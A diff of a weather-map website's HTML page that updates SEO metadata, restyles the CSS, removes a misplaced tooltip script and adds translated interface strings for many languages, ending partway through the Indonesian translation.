@@ -4,9 +4,12 @@
   <!-- Basic meta -->
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>MapMyWeather — Global interactive weather map</title>
-  <meta name="description" content="MapMyWeather — an interactive global weather map with live forecasts, temperature, wind and rain overlays. Fast, mobile-friendly and easy to use.">
+  <title>MapMyWeather — Global Interactive Weather Map | Live Forecasts & Radar</title>
+  <meta name="description" content="Free interactive world weather map with live forecasts. Check temperature, wind, rain, and humidity for any city worldwide. Real-time weather data from WeatherAPI.">
+  <meta name="keywords" content="weather, weather map, live weather, world weather, temperature, forecast, wind, rain, humidity, weather radar, global weather, local weather, weather today, weather forecast, weather API">
 
+  <!-- Canonical (important if same content appears elsewhere) -->
+  <link rel="canonical" href="https://map-my-weather.netlify.app/">
 
   <!-- Favicon / icons -->
   <link rel="icon" href="/favicon.png" type="image/png" sizes="512x512">
@@ -19,8 +22,8 @@
   <!-- Social (Open Graph) -->
   <meta property="og:locale" content="en_US" />
   <meta property="og:type" content="website" />
-  <meta property="og:title" content="MapMyWeather — Global interactive weather map" />
-  <meta property="og:description" content="Interactive global weather map with live forecasts, temperature, wind and rain overlays." />
+  <meta property="og:title" content="MapMyWeather — Global Interactive Weather Map | Live Forecasts" />
+  <meta property="og:description" content="Free interactive world weather map with live forecasts, temperature, wind, rain and humidity data for any location worldwide." />
   <meta property="og:url" content="https://map-my-weather.netlify.app/" />
   <meta property="og:site_name" content="MapMyWeather" />
   <meta property="og:image" content="https://map-my-weather.netlify.app/og-image.png" />
@@ -29,14 +32,25 @@
 
   <!-- Twitter card -->
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="MapMyWeather — Global interactive weather map">
-  <meta name="twitter:description" content="Interactive global weather map with live forecasts, temperature, wind and rain overlays.">
+  <meta name="twitter:title" content="MapMyWeather — Global Interactive Weather Map">
+  <meta name="twitter:description" content="Free interactive world weather map with live forecasts, temperature, wind, and rain data.">
   <meta name="twitter:image" content="https://map-my-weather.netlify.app/og-image.png">
 
   <!-- Robots -->
-  <meta name="robots" content="index, follow">
+  <meta name="robots" content="index, follow, max-image-preview:large">
 
-  <!-- Structured data (JSON-LD) -->
+  <!-- Additional SEO Meta -->
+  <meta name="author" content="MapMyWeather">
+  <meta name="theme-color" content="#4a90e2">
+  <meta name="subject" content="Weather forecasts and maps">
+  <meta name="rating" content="General">
+  <meta name="revisit-after" content="1 day">
+  
+  <!-- Geo and Location Meta -->
+  <meta name="geo.region" content="Global">
+  <meta name="geo.placename" content="Worldwide">
+
+  <!-- Structured data (JSON-LD) - Enhanced for Weather Service -->
   <script type="application/ld+json">
   {
     "@context": "https://schema.org",
@@ -47,6 +61,7 @@
         "name": "MapMyWeather",
         "url": "https://map-my-weather.netlify.app/",
         "logo": "https://map-my-weather.netlify.app/favicon.png",
+        "description": "Interactive global weather map providing live forecasts and weather data",
         "sameAs": []
       },
       {
@@ -61,6 +76,14 @@
           "target": "https://map-my-weather.netlify.app/?s={search_term_string}",
           "query-input": "required name=search_term_string"
         }
+      },
+      {
+        "@type": "Service",
+        "name": "Weather Forecast Service",
+        "description": "Real-time weather forecasts and interactive weather maps for locations worldwide",
+        "provider": { "@id": "https://map-my-weather.netlify.app/#organization" },
+        "areaServed": "Worldwide",
+        "serviceType": "Weather Forecasting"
       }
     ]
   }
@@ -76,39 +99,65 @@
   />
 
   <style>
+    :root {
+      --primary: #4a90e2;
+      --primary-dark: #357ABD;
+      --secondary: #ff7043;
+      --secondary-dark: #e64a19;
+      --accent: #f0ad4e;
+      --accent-dark: #ec971f;
+      --danger: #d9534f;
+      --danger-dark: #c9302c;
+      --light: #f8f9fa;
+      --dark: #343a40;
+      --gray: #6c757d;
+      --success: #28a745;
+    }
+    
+    * {
+      box-sizing: border-box;
+    }
+    
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       margin: 0;
-      background: linear-gradient(to right, #74ebd5, #ACB6E5);
-      color: #222;
+      background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
+      color: var(--dark);
+      line-height: 1.6;
     }
 
     header {
-      padding: 1rem 2rem;
-      background: rgba(255, 255, 255, 0.85);
+      padding: 1.5rem 2rem;
+      background: rgba(255, 255, 255, 0.95);
       text-align: center;
-      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
       display: flex;
       flex-wrap: wrap;
       align-items: center;
       justify-content: center;
       gap: 1rem;
+      backdrop-filter: blur(10px);
     }
 
     header h1 {
       margin: 0;
-      font-size: 2rem;
+      font-size: 2.2rem;
       flex-basis: 100%;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-weight: 700;
     }
 
     header p {
       margin: 0 0 1rem 0;
       font-size: 1.1rem;
       flex-basis: 100%;
+      color: var(--gray);
     }
 
     #searchForm {
-      max-width: 400px;
+      max-width: 500px;
       display: flex;
       gap: 0.5rem;
       flex-wrap: wrap;
@@ -119,60 +168,73 @@
 
     #searchInput {
       flex-grow: 1;
-      padding: 0.6rem 1rem;
-      border: none;
-      border-radius: 24px;
+      padding: 0.75rem 1.2rem;
+      border: 2px solid transparent;
+      border-radius: 30px;
       font-size: 1rem;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+      box-shadow: 0 3px 10px rgba(0,0,0,0.1);
       min-width: 150px;
+      transition: all 0.3s ease;
+      background: rgba(255, 255, 255, 0.9);
+    }
+
+    #searchInput:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 3px 15px rgba(74, 144, 226, 0.3);
     }
 
     #searchButton {
-      padding: 0.6rem 1.2rem;
-      background-color: #4a90e2;
+      padding: 0.75rem 1.5rem;
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
       border: none;
-      border-radius: 24px;
+      border-radius: 30px;
       color: white;
       font-weight: bold;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      transition: all 0.3s ease;
       min-width: 100px;
+      box-shadow: 0 3px 10px rgba(74, 144, 226, 0.3);
     }
 
     #searchButton:hover {
-      background-color: #357ABD;
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(74, 144, 226, 0.4);
     }
 
     #gameButton {
-      padding: 0.6rem 1.2rem;
-      background-color: #ff7043;
+      padding: 0.75rem 1.5rem;
+      background: linear-gradient(135deg, var(--secondary), var(--secondary-dark));
       border: none;
-      border-radius: 24px;
+      border-radius: 30px;
       color: white;
       font-weight: bold;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      transition: all 0.3s ease;
       min-width: 180px;
-      box-shadow: 0 3px 6px rgba(0,0,0,0.15);
+      box-shadow: 0 3px 10px rgba(255, 112, 67, 0.3);
     }
 
     #gameButton:hover {
-      background-color: #e64a19;
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(255, 112, 67, 0.4);
     }
 
     #settingsBtn {
-      padding: 0.5rem 1rem;
-      background-color: #777;
+      padding: 0.6rem 1.2rem;
+      background: linear-gradient(135deg, var(--gray), #5a6268);
       border: none;
-      border-radius: 24px;
+      border-radius: 30px;
       color: white;
       font-weight: bold;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      transition: all 0.3s ease;
       min-width: 120px;
+      box-shadow: 0 3px 10px rgba(108, 117, 125, 0.3);
     }
     #settingsBtn:hover {
-      background-color: #555;
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(108, 117, 125, 0.4);
     }
 
     #settingsModal {
@@ -182,196 +244,294 @@
       left: 50%;
       transform: translateX(-50%);
       background: white;
-      padding: 1rem 2rem;
-      border-radius: 12px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      padding: 1.5rem 2rem;
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
       z-index: 10000;
-      min-width: 280px;
+      min-width: 300px;
       text-align: center;
+      backdrop-filter: blur(10px);
     }
     #settingsModal.show {
       display: block;
     }
     #settingsModal label {
       font-weight: bold;
-      margin-bottom: 0.5rem;
+      margin-bottom: 0.8rem;
       display: block;
+      color: var(--dark);
+      font-size: 1.1rem;
     }
     #settingsModal select {
       width: 100%;
-      padding: 0.5rem;
+      padding: 0.7rem;
       font-size: 1rem;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      margin-bottom: 1rem;
+      border-radius: 10px;
+      border: 2px solid #e9ecef;
+      margin-bottom: 1.2rem;
+      transition: border-color 0.3s;
+    }
+    #settingsModal select:focus {
+      outline: none;
+      border-color: var(--primary);
     }
     #settingsModal button {
-      padding: 0.5rem 1rem;
+      padding: 0.7rem 1.5rem;
       border: none;
-      border-radius: 8px;
-      background-color: #4a90e2;
+      border-radius: 10px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
       color: white;
       font-weight: bold;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      transition: all 0.3s ease;
+      box-shadow: 0 3px 10px rgba(74, 144, 226, 0.3);
     }
     #settingsModal button:hover {
-      background-color: #357ABD;
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(74, 144, 226, 0.4);
     }
 
     main {
-      max-width: 1000px;
-      margin: 1rem auto;
-      padding: 0 1rem;
+      max-width: 1200px;
+      margin: 1.5rem auto;
+      padding: 0 1.5rem;
     }
 
     #map {
-      height: 450px;
+      height: 500px;
+      border-radius: 16px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+      overflow: hidden;
+      margin-bottom: 2rem;
+      position: relative;
+    }
+
+    /* City weather banners on map */
+    .city-weather-banner {
+      position: absolute;
+      background: rgba(255, 255, 255, 0.95);
       border-radius: 12px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+      padding: 0.8rem 1rem;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+      z-index: 1000;
+      max-width: 250px;
+      backdrop-filter: blur(5px);
+      border-left: 4px solid var(--primary);
+      transition: all 0.3s ease;
+      font-size: 0.9rem;
+    }
+    
+    .city-weather-banner:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 6px 20px rgba(0,0,0,0.2);
+    }
+    
+    .city-weather-banner h3 {
+      margin: 0 0 0.3rem 0;
+      font-size: 1rem;
+      color: var(--dark);
+    }
+    
+    .city-weather-banner .temp {
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: var(--primary);
+    }
+    
+    .city-weather-banner .desc {
+      font-style: italic;
+      color: var(--gray);
+      font-size: 0.85rem;
+      margin-bottom: 0.3rem;
+    }
+    
+    .city-weather-banner .details {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.8rem;
+      color: var(--gray);
     }
 
     /* Favorite section right below map */
     #favoritesSection {
-      margin-top: 1rem;
+      margin-top: 1.5rem;
       background: rgba(255, 255, 255, 0.95);
-      border-radius: 12px;
-      padding: 1rem;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      border-radius: 16px;
+      padding: 1.5rem;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
+      backdrop-filter: blur(10px);
     }
 
     #favoritesSection h2 {
       margin-top: 0;
+      color: var(--dark);
+      border-bottom: 2px solid var(--primary);
+      padding-bottom: 0.5rem;
     }
 
     #addFavoriteForm {
       display: flex;
       gap: 0.5rem;
-      margin-bottom: 1rem;
+      margin-bottom: 1.5rem;
       flex-wrap: wrap;
       justify-content: center;
     }
 
     #addFavoriteInput {
       flex-grow: 1;
-      padding: 0.5rem 1rem;
-      border-radius: 24px;
-      border: 1px solid #ccc;
+      padding: 0.7rem 1.2rem;
+      border-radius: 30px;
+      border: 2px solid #e9ecef;
       font-size: 1rem;
       min-width: 200px;
+      transition: all 0.3s ease;
+    }
+    
+    #addFavoriteInput:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 3px 15px rgba(240, 173, 78, 0.3);
     }
 
     #addFavoriteBtn {
-      padding: 0.5rem 1.2rem;
-      background-color: #f0ad4e;
+      padding: 0.7rem 1.5rem;
+      background: linear-gradient(135deg, var(--accent), var(--accent-dark));
       border: none;
-      border-radius: 24px;
+      border-radius: 30px;
       color: white;
       font-weight: bold;
       cursor: pointer;
-      min-width: 120px;
-      transition: background-color 0.3s ease;
+      min-width: 150px;
+      transition: all 0.3s ease;
+      box-shadow: 0 3px 10px rgba(240, 173, 78, 0.3);
     }
 
     #addFavoriteBtn:hover {
-      background-color: #ec971f;
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(240, 173, 78, 0.4);
     }
 
     #favoritesContainer {
       display: flex;
       flex-wrap: wrap;
-      gap: 1rem;
+      gap: 1.5rem;
       justify-content: center;
     }
 
     .city-weather {
       background: rgba(255, 255, 255, 0.95);
-      border-radius: 12px;
-      padding: 1rem;
-      width: 200px;
+      border-radius: 16px;
+      padding: 1.2rem;
+      width: 220px;
       text-align: center;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
       cursor: pointer;
       position: relative;
-      transition: transform 0.2s;
+      transition: all 0.3s ease;
+      border-top: 4px solid var(--primary);
+      backdrop-filter: blur(5px);
     }
 
     .city-weather:hover {
-      transform: scale(1.03);
+      transform: translateY(-5px);
+      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
     }
 
     .city-weather h3 {
       margin-top: 0;
+      color: var(--dark);
     }
 
     .temp {
-      font-size: 1.5rem;
+      font-size: 1.8rem;
       font-weight: bold;
+      color: var(--primary);
+      margin: 0.5rem 0;
     }
 
     .desc {
       font-style: italic;
-      color: #444;
+      color: var(--gray);
+      margin-bottom: 0.5rem;
+    }
+    
+    .details {
+      display: flex;
+      justify-content: space-around;
+      font-size: 0.9rem;
+      color: var(--gray);
+      margin-bottom: 0.5rem;
     }
 
     .remove-fav-btn {
-      background-color: #d9534f;
+      background: linear-gradient(135deg, var(--danger), var(--danger-dark));
       color: white;
       border: none;
       border-radius: 50%;
-      font-size: 16px;
-      width: 24px;
-      height: 24px;
-      line-height: 24px;
+      font-size: 14px;
+      width: 26px;
+      height: 26px;
+      line-height: 26px;
       padding: 0;
       position: absolute;
-      top: 8px;
-      right: 8px;
+      top: 10px;
+      right: 10px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
+      transition: all 0.3s ease;
+      box-shadow: 0 2px 5px rgba(217, 83, 79, 0.3);
     }
     .remove-fav-btn:hover {
-      background-color: #c9302c;
+      transform: scale(1.1);
+      box-shadow: 0 3px 8px rgba(217, 83, 79, 0.4);
     }
 
     #about {
-      margin-top: 2rem;
-      background: rgba(255, 255, 255, 0.9);
-      padding: 1.5rem;
-      border-radius: 12px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+      margin-top: 2.5rem;
+      background: rgba(255, 255, 255, 0.95);
+      padding: 1.8rem;
+      border-radius: 16px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
+      backdrop-filter: blur(10px);
+    }
+    
+    #about h2 {
+      color: var(--dark);
+      border-bottom: 2px solid var(--primary);
+      padding-bottom: 0.5rem;
     }
 
     footer {
       text-align: center;
-      padding: 1rem;
+      padding: 1.5rem;
       font-size: 0.9rem;
-      color: #444;
+      color: var(--gray);
+      margin-top: 2rem;
     }
 
     #feedbackBtn {
       position: fixed;
       bottom: 20px;
       right: 20px;
-      background-color: #4a90e2;
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
       color: white;
-      padding: 0.7rem 1.2rem;
+      padding: 0.8rem 1.5rem;
       border: none;
-      border-radius: 999px;
+      border-radius: 30px;
       font-weight: bold;
       cursor: pointer;
       font-size: 0.95rem;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-      transition: background-color 0.3s ease;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      transition: all 0.3s ease;
       z-index: 9999;
       text-decoration: none;
     }
 
     #feedbackBtn:hover {
-      background-color: #357ABD;
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
     }
 
-    @media (max-width: 600px) {
+    @media (max-width: 768px) {
       #favoritesContainer {
         flex-direction: column;
         align-items: center;
@@ -382,47 +542,13 @@
       }
       #searchInput, #searchButton, #gameButton, #addFavoriteInput, #addFavoriteBtn, #settingsBtn {
         min-width: 100%;
-        border-radius: 24px;
+        border-radius: 30px;
+      }
+      .city-weather-banner {
+        max-width: 200px;
+        font-size: 0.8rem;
       }
     }
-    // Weather tooltip on marker press-and-hold
-let weatherTooltip;
-
-cities.forEach(city => {
-  const marker = L.marker(city.coords).addTo(map);
-  marker.bindPopup(city.name);
-
-  marker.on("click", () => {
-    window.location.href = `weather.html?city=${encodeURIComponent(city.name)}`;
-  });
-
-  marker.on("mousedown", async () => {
-    try {
-      const res = await fetch(`https://api.weatherapi.com/v1/current.json?key=${WEATHER_API_KEY}&q=${encodeURIComponent(city.name)}`);
-      const data = await res.json();
-
-      weatherTooltip = L.popup({
-        closeButton: false,
-        autoClose: false,
-        className: 'weather-desc-popup'
-      })
-        .setLatLng(city.coords)
-        .setContent(`<strong>${city.name}</strong><br>${data.current.condition.text}, ${data.current.temp_c}°C`)
-        .openOn(map);
-    } catch (err) {
-      console.error("Weather fetch error:", err);
-    }
-  });
-
-  marker.on("mouseup", () => {
-    if (weatherTooltip) map.closePopup(weatherTooltip);
-  });
-
-  marker.on("mouseout", () => {
-    if (weatherTooltip) map.closePopup(weatherTooltip);
-  });
-});
-
   </style>
 </head>
 <body>
@@ -473,10 +599,21 @@ cities.forEach(city => {
 
 <!-- Settings Modal -->
 <div id="settingsModal" role="dialog" aria-modal="true" aria-labelledby="settingsModalLabel">
-  <label for="languageSelect" id="settingsModalLabel">Select Language / Selecionar Idioma</label>
+  <label for="languageSelect" id="settingsModalLabel">Select Language</label>
   <select id="languageSelect" aria-describedby="settingsModalLabel">
     <option value="en">English</option>
-    <option value="pt">Português (Brasil)</option>
+    <option value="zh">中文 (Chinese)</option>
+    <option value="hi">हिन्दी (Hindi)</option>
+    <option value="es">Español (Spanish)</option>
+    <option value="fr">Français (French)</option>
+    <option value="ar">العربية (Arabic)</option>
+    <option value="bn">বাংলা (Bengali)</option>
+    <option value="ru">Русский (Russian)</option>
+    <option value="pt">Português (Portuguese)</option>
+    <option value="id">Bahasa Indonesia (Indonesian)</option>
+    <option value="ur">اردو (Urdu)</option>
+    <option value="de">Deutsch (German)</option>
+    <option value="ja">日本語 (Japanese)</option>
   </select>
   <button id="saveSettingsBtn">Save</button>
 </div>
@@ -500,11 +637,13 @@ cities.forEach(city => {
       addFavoritePlaceholder: "Add a city to favorites",
       addFavoriteBtn: "Add to Favorites",
       aboutTitle: "About MapMyWeather",
-      aboutText: "MapMyWeather is an interactive world map showing current weather conditions for major global cities.\nClick on any marker to learn more about the weather there, or use the search bar to view a detailed forecast.\nThis app is powered by WeatherAPI.com and is entirely free to use.",
+      aboutText: "MapMyWeather is an interactive world map showing current weather conditions for major global cities. Click on any marker to learn more about the weather there, or use the search bar to view a detailed forecast. This app is powered by WeatherAPI.com and is entirely free to use.",
       noFavorites: "No favorite locations yet.",
       removeFavTitle: "Remove from favorites",
-      settingsLabel: "Select Language / Selecionar Idioma",
-      saveBtn: "Save"
+      settingsLabel: "Select Language",
+      saveBtn: "Save",
+      humidity: "Humidity",
+      wind: "Wind"
     },
     pt: {
       title: "MapMeuTempo",
@@ -517,11 +656,222 @@ cities.forEach(city => {
       addFavoritePlaceholder: "Adicione uma cidade aos favoritos",
       addFavoriteBtn: "Adicionar aos favoritos",
       aboutTitle: "Sobre o MapMeuTempo",
-      aboutText: "MapMeuTempo é um mapa interativo mundial que mostra condições climáticas atuais para as principais cidades globais.\nClique em qualquer marcador para saber mais sobre o clima, ou use a barra de pesquisa para ver a previsão detalhada.\nEste app é alimentado pelo WeatherAPI.com e é totalmente gratuito.",
+      aboutText: "MapMeuTempo é um mapa interativo mundial que mostra condições climáticas atuais para as principais cidades globais. Clique em qualquer marcador para saber mais sobre o clima, ou use a barra de pesquisa para ver a previsão detalhada. Este app é alimentado pelo WeatherAPI.com e é totalmente gratuito.",
       noFavorites: "Nenhum local favorito ainda.",
       removeFavTitle: "Remover dos favoritos",
-      settingsLabel: "Selecione o idioma / Select Language",
-      saveBtn: "Salvar"
+      settingsLabel: "Selecione o idioma",
+      saveBtn: "Salvar",
+      humidity: "Umidade",
+      wind: "Vento"
+    },
+    es: {
+      title: "MapaMiClima",
+      subtitle: "Explore el clima en tiempo real en todo el mundo o busque cualquier ciudad a continuación",
+      searchPlaceholder: "Buscar una ciudad (ej: Londres)",
+      searchButton: "Buscar",
+      gameButton: "🎮 Jugar WeatherGuessr",
+      settingsBtn: "Configuración ⚙️",
+      favoritesTitle: "Tus ubicaciones favoritas",
+      addFavoritePlaceholder: "Agregar una ciudad a favoritos",
+      addFavoriteBtn: "Agregar a favoritos",
+      aboutTitle: "Acerca de MapaMiClima",
+      aboutText: "MapaMiClima es un mapa mundial interactivo que muestra las condiciones climáticas actuales para las principales ciudades globales. Haga clic en cualquier marcador para obtener más información sobre el clima allí, o use la barra de búsqueda para ver un pronóstico detallado. Esta aplicación funciona con WeatherAPI.com y es completamente gratuita.",
+      noFavorites: "Aún no hay ubicaciones favoritas.",
+      removeFavTitle: "Eliminar de favoritos",
+      settingsLabel: "Seleccionar idioma",
+      saveBtn: "Guardar",
+      humidity: "Humedad",
+      wind: "Viento"
+    },
+    fr: {
+      title: "CarteMétéo",
+      subtitle: "Explorez la météo en temps réel dans le monde entier ou recherchez n'importe quelle ville ci-dessous",
+      searchPlaceholder: "Rechercher une ville (ex: Londres)",
+      searchButton: "Rechercher",
+      gameButton: "🎮 Jouer à WeatherGuessr",
+      settingsBtn: "Paramètres ⚙️",
+      favoritesTitle: "Vos emplacements favoris",
+      addFavoritePlaceholder: "Ajouter une ville aux favoris",
+      addFavoriteBtn: "Ajouter aux favoris",
+      aboutTitle: "À propos de CarteMétéo",
+      aboutText: "CarteMétéo est une carte mondiale interactive affichant les conditions météorologiques actuelles pour les principales villes mondiales. Cliquez sur n'importe quel marqueur pour en savoir plus sur la météo là-bas, ou utilisez la barre de recherche pour afficher une prévision détaillée. Cette application est propulsée par WeatherAPI.com et est entièrement gratuite.",
+      noFavorites: "Aucun emplacement favori pour le moment.",
+      removeFavTitle: "Supprimer des favoris",
+      settingsLabel: "Sélectionner la langue",
+      saveBtn: "Enregistrer",
+      humidity: "Humidité",
+      wind: "Vent"
+    },
+    de: {
+      title: "KarteMeinWetter",
+      subtitle: "Erkunden Sie Echtzeit-Wetter weltweit oder suchen Sie unten nach einer Stadt",
+      searchPlaceholder: "Stadt suchen (z.B. London)",
+      searchButton: "Suchen",
+      gameButton: "🎮 WeatherGuessr spielen",
+      settingsBtn: "Einstellungen ⚙️",
+      favoritesTitle: "Ihre Lieblingsorte",
+      addFavoritePlaceholder: "Stadt zu Favoriten hinzufügen",
+      addFavoriteBtn: "Zu Favoriten hinzufügen",
+      aboutTitle: "Über KarteMeinWetter",
+      aboutText: "KarteMeinWetter ist eine interaktive Weltkarte, die aktuelle Wetterbedingungen für wichtige globale Städte anzeigt. Klicken Sie auf eine Markierung, um mehr über das Wetter dort zu erfahren, oder verwenden Sie die Suchleiste, um eine detaillierte Vorhersage anzuzeigen. Diese App wird von WeatherAPI.com betrieben und ist völlig kostenlos.",
+      noFavorites: "Noch keine Lieblingsorte.",
+      removeFavTitle: "Aus Favoriten entfernen",
+      settingsLabel: "Sprache auswählen",
+      saveBtn: "Speichern",
+      humidity: "Luftfeuchtigkeit",
+      wind: "Wind"
+    },
+    zh: {
+      title: "我的天气地图",
+      subtitle: "探索全球实时天气或搜索下方任何城市",
+      searchPlaceholder: "搜索城市（例如：伦敦）",
+      searchButton: "搜索",
+      gameButton: "🎮 玩天气猜猜乐",
+      settingsBtn: "设置 ⚙️",
+      favoritesTitle: "您喜欢的地点",
+      addFavoritePlaceholder: "添加城市到收藏夹",
+      addFavoriteBtn: "添加到收藏夹",
+      aboutTitle: "关于我的天气地图",
+      aboutText: "我的天气地图是一个交互式世界地图，显示全球主要城市的当前天气状况。点击任何标记以了解那里的天气，或使用搜索栏查看详细预报。此应用程序由 WeatherAPI.com 提供支持，完全免费使用。",
+      noFavorites: "还没有收藏的地点。",
+      removeFavTitle: "从收藏夹中移除",
+      settingsLabel: "选择语言",
+      saveBtn: "保存",
+      humidity: "湿度",
+      wind: "风"
+    },
+    hi: {
+      title: "मैपमाइवेदर",
+      subtitle: "विश्व भर में रीयल-टाइम मौसम का अन्वेषण करें या नीचे किसी भी शहर को खोजें",
+      searchPlaceholder: "एक शहर खोजें (उदाहरण: लंदन)",
+      searchButton: "खोजें",
+      gameButton: "🎮 वेदरगेसर खेलें",
+      settingsBtn: "सेटिंग्स ⚙️",
+      favoritesTitle: "आपके पसंदीदा स्थान",
+      addFavoritePlaceholder: "पसंदीदा में एक शहर जोड़ें",
+      addFavoriteBtn: "पसंदीदा में जोड़ें",
+      aboutTitle: "मैपमाइवेदर के बारे में",
+      aboutText: "मैपमाइवेदर एक इंटरैक्टिव वर्ल्ड मैप है जो प्रमुख वैश्विक शहरों के लिए वर्तमान मौसम की स्थिति दिखाता है। वहां के मौसम के बारे में अधिक जानने के लिए किसी भी मार्कर पर क्लिक करें, या विस्तृत पूर्वानुमान देखने के लिए सर्च बार का उपयोग करें। यह ऐप WeatherAPI.com द्वारा संचालित है और पूरी तरह से मुफ्त है।",
+      noFavorites: "अभी तक कोई पसंदीदा स्थान नहीं।",
+      removeFavTitle: "पसंदीदा से हटाएं",
+      settingsLabel: "भाषा चुनें",
+      saveBtn: "सहेजें",
+      humidity: "नमी",
+      wind: "हवा"
+    },
+    ar: {
+      title: "خريطةطقسى",
+      subtitle: "استكشف الطقس في الوقت الحقيقي في جميع أنحاء العالم أو ابحث عن أي مدينة أدناه",
+      searchPlaceholder: "ابحث عن مدينة (مثال: لندن)",
+      searchButton: "بحث",
+      gameButton: "🎮 العب WeatherGuessr",
+      settingsBtn: "الإعدادات ⚙️",
+      favoritesTitle: "مواقعك المفضلة",
+      addFavoritePlaceholder: "أضف مدينة إلى المفضلة",
+      addFavoriteBtn: "أضف إلى المفضلة",
+      aboutTitle: "حول خريطةطقسى",
+      aboutText: "خريطةطقسى هي خريطة عالمية تفاعلية تعرض أحوال الطقس الحالية للمدن العالمية الرئيسية. انقر فوق أي علامة لمعرفة المزيد عن الطقس هناك، أو استخدم شريط البحث لعرض توقعات مفصلة. يتم تشغيل هذا التطبيق بواسطة WeatherAPI.com وهو مجاني بالكامل.",
+      noFavorites: "لا توجد مواقع مفضلة حتى الآن.",
+      removeFavTitle: "إزالة من المفضلة",
+      settingsLabel: "اختر اللغة",
+      saveBtn: "حفظ",
+      humidity: "الرطوبة",
+      wind: "الرياح"
+    },
+    ru: {
+      title: "КартаМойПогода",
+      subtitle: "Изучайте погоду в реальном времени по всему миру или найдите любой город ниже",
+      searchPlaceholder: "Поиск города (например: Лондон)",
+      searchButton: "Поиск",
+      gameButton: "🎮 Играть в WeatherGuessr",
+      settingsBtn: "Настройки ⚙️",
+      favoritesTitle: "Ваши избранные места",
+      addFavoritePlaceholder: "Добавить город в избранное",
+      addFavoriteBtn: "Добавить в избранное",
+      aboutTitle: "О КартаМойПогода",
+      aboutText: "КартаМойПогода - это интерактивная мировая карта, показывающая текущие погодные условия для основных глобальных городов. Нажмите на любой маркер, чтобы узнать больше о погоде там, или используйте строку поиска, чтобы просмотреть подробный прогноз. Это приложение работает на WeatherAPI.com и полностью бесплатно.",
+      noFavorites: "Пока нет избранных мест.",
+      removeFavTitle: "Удалить из избранного",
+      settingsLabel: "Выберите язык",
+      saveBtn: "Сохранить",
+      humidity: "Влажность",
+      wind: "Ветер"
+    },
+    ja: {
+      title: "マップマイ天気",
+      subtitle: "世界中のリアルタイムの天気を探索するか、以下の都市を検索してください",
+      searchPlaceholder: "都市を検索（例：ロンドン）",
+      searchButton: "検索",
+      gameButton: "🎮 ウェザーゲッサーをプレイ",
+      settingsBtn: "設定 ⚙️",
+      favoritesTitle: "お気に入りの場所",
+      addFavoritePlaceholder: "都市をお気に入りに追加",
+      addFavoriteBtn: "お気に入りに追加",
+      aboutTitle: "マップマイ天気について",
+      aboutText: "マップマイ天気は、主要な世界の都市の現在の気象状況を表示するインタラクティブな世界地図です。マーカーをクリックして天気の詳細を確認するか、検索バーを使用して詳細な予報を表示します。このアプリはWeatherAPI.comによって支えられており、完全に無料で使用できます。",
+      noFavorites: "まだお気に入りの場所はありません。",
+      removeFavTitle: "お気に入りから削除",
+      settingsLabel: "言語を選択",
+      saveBtn: "保存",
+      humidity: "湿度",
+      wind: "風"
+    },
+    id: {
+      title: "PetaCuacaSaya",
+      subtitle: "Jelajahi cuaca real-time di seluruh dunia atau cari kota apa pun di bawah",
+      searchPlaceholder: "Cari kota (contoh: London)",
+      searchButton: "Cari",
+      gameButton: "🎮 Main WeatherGuessr",
+      settingsBtn: "Pengaturan ⚙️",
+      favoritesTitle: "Lokasi Favorit Anda",
+      addFavoritePlaceholder: "Tambahkan kota ke favorit",
+      addFavoriteBtn: "Tambahkan ke Favorit",
+      aboutTitle: "Tentang PetaCuacaSaya",
+      aboutText: "PetaCuacaSaya adalah peta dunia interaktif yang menunjukkan kondisi cuaca saat ini untuk kota-kota global utama. Klik pada penanda mana pun untuk mempelajari lebih lanjut tentang cuaca di sana, atau gunakan bilah pencarian untuk melihat ramalan detail. Aplikasi ini didukung oleh WeatherAPI.com dan sepenuhnya gratis digunakan.",
+      noFavorites: "Belum ada lokasi favorit.",
+      removeFavTitle: "Hapus dari favorit",
+      settingsLabel: "Pilih bahasa",
